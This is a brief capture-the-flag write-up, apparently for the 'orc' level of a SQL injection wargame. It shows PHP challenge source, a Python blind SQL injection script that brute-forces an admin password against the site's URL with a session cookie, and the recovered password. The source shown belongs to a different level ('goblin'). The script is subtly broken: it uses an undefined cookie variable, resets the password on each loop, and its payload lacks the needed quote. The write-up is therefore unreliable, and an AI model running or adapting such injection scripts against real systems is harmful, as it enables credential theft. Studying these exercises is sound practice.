

#  ORC

```

<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

Found the length by passing length(pw) function==8.This has a blind sqli injection.Passing my php session id as a cookie to automate the process.
###### Password:095a9852

```
import requests
import string
numbers = "0123456789"
characters = string.ascii_letters + numbers
session = {
    "PHPSESSID": "dovaradinkdstego4urhvano2"
}
dbpass = ""
for i in range(1, 10):
    dbpass = ""
    for char in characters:
        paran = {
            "pw": f"OR LEFT(pw, {i}) = '{dbpass + char}' -- "
        }
        response = requests.get("https://los.rubiya.kr/chall/orc_60e5b360795c119588e4f3a86c5dd494.php", params=paran, cookies=sesszen)
        output = response.text
        if "Hello admin" in output:
            dbpass += char
            break
print("Password:", dbpass)
```
 ***
####   query : select id from prob_orc where id='admin' and pw='095a9852'
***
